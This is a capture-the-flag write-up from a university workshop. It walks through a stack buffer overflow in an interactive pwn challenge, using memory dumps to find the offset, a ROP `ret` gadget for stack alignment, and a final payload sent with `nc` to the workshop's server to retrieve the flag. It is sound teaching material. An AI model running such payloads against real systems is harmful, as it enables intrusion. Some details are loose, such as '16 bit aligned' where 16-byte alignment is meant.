# Overview
The program aims to provide a reduced `pwn`ing environment similar to that of gdb,
where you can test your exploit and check memory values live. It also makes it easy
to deduce the memory (stack) layout of the program, allowing easy offset and memory
address calculations to craft your exploit.

# Vulnerability
The `input` command allows the user to enter data of arbitrary length and content (except newline)
into the stack. This makes corrupting return address possible.

# Exploit crafting
## 1. Positioning the payload
We first observe the position of the return address of the current function. By looking
at the source code, we can see that the `input` command located in `play`, which is
in turn called by `main`. This means that our return address should point to somewhere
in `main`.

Let us look at the address of main and the memory:
```
> main
main: 0x4e4e22
> dump 64 
01 00 00 00 00 00 00 00         
00 00 00 00 00 00 00 00         
18 6e 4e 00 64 75 6d 70  nN dump
20 36 34 00 01 00 00 00  64     
60 1f 5b 3c fe 7f 00 00 ` [<    
7b 4e 4e 00 00 00 00 00 {NN     
88 20 5b 3c fe 7f 00 00   [<    
88 20 5b 3c 01 00 00 00   [<
```
Since the return address is somewhere in `main`, the address should be
close to and larger than `main` (the displayed address refers to *the start* of the `main` function). This line matches perfectly, `7b 4e 4e 00 00 00 00 00 {NN`, and in front of it there are 5 lines. Therefore we can deduce that the padding[^1] should be `8*5=40` bytes.

## 2. Target
Looking at the source code, `win` calls `cat /flag`, which should print our flag. The straight forward intuition will be to change the return address of `main` to `win`, so that the `win` function is executed.

What is the address of `win` function? `0x4e4957`. Since Intel is a `little-endian` system, bytes of numbers will be placed **in reverse order** in the memory, i.e. from low order to high order, like that one that we dumped from the memory. So we need to type `57 49 4e`. What is that? Using a trusty hex editor to decode it into ASCII you can see that is just the letters `WIN`.

We end up with this for `input`:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWIN
```

The memory layout should look like this:
```
> dump 64
41 41 41 41 41 41 41 41 AAAAAAAA
41 41 41 41 41 41 41 41 AAAAAAAA
41 41 41 41 64 75 6d 70 AAAAdump
20 36 34 00 01 00 00 00  64     
41 41 41 41 41 41 41 41 AAAAAAAA
57 49 4e 00 00 00 00 00 WIN     
d8 9b fb cd fd 7f 00 00         
d8 9b fb cd 01 00 00 00
```

## 3. A hiccup: Stack Alignment
However if you try this in the live instance, you will find that it does not work. This is because [the stack is not 16-byte aligned when system is called](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment), causing the program to segfault in the `win` function without printing the flag. This can be verified by running `gdb` on it the right environment.

To mitigate this, we can use the [ROP (Return Oriented Programming)](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming) technique to move the stack to make it 16 bit aligned[^2] with a `ret` instruction. `ret` instruction is comparable to a `pop` followed by a `jump`, which `pop` increments the stack pointer by a word (8 bytes on 64-bit computers). The stack will be realligned when `system` is executed in `win`.

To execute a `ret` instruction, we search for the instruction in the binary:
```
ROPgadget --binary chall
Gadgets information
============================================================
...
0x000000000040101a : ret
...
```
To execute this instruction, we return to that instruction. The `ret` instruction itself can then `ret` to the win function.

We append `0x000000000040101a` before the WIN address, and we get our final payload:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10\x40\x00\x00\x00\x00\x00\x57\x49\x4e\x00\x00\x00\x00\x00
```

Exploit command:
```
echo -e "input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10\x40\x00\x00\x00\x00\x00\x57\x49\x4e\x00\x00\x00\x00\x00
\nquit" | nc workshop.f21endsh1p.me 9999
```

And you will get the flag: `cuhk24ctf-workshop{My_first_InterACTIVe_SELF_pwnPWn_aKa_wITH_cHEats_0925}`

[^1]: It does not matter what you put inside the padding, our target is only make our desired return address to reside in the location of where `7b 4e 4e` is.

[^2]: i.e. The stack pointer address ends with `0` in hex.
